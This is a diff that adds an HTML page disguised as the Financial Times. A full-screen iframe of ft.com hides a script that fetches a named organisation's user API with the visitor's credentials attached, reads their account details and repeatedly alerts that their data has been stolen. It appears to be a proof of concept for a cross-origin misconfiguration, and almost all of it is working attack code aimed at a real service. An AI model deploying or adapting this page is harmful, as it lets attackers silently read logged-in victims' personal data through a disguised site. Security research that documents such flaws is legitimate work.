@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Financial Times</title>
+    <link rel="icon" type="image/png" href="https://www.ft.com/__origami/service/image/v2/images/raw/ftlogo-v1%3Abrand-ft-logo-square-coloured?source=update-logos&amp;width=32&amp;height=32&amp;format=png" sizes="32x32">
+  </head>
+  <body>
+    <iframe src="https://www.ft.com/fastft" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+      Your browser doesn't support iframes
+    </iframe>
+    
+    <script>
+      fetch("https://pelive.gic.com.sg/cube/api/v1/User", {
+        credentials: "include"
+      }).then(resp =>
+        resp.json().then(e => {
+          setInterval(() => window.alert("Hi " + e.name + " your data has been stolen"), 5000);
+        })
+      );
+    </script>
+  </body>
+</html>
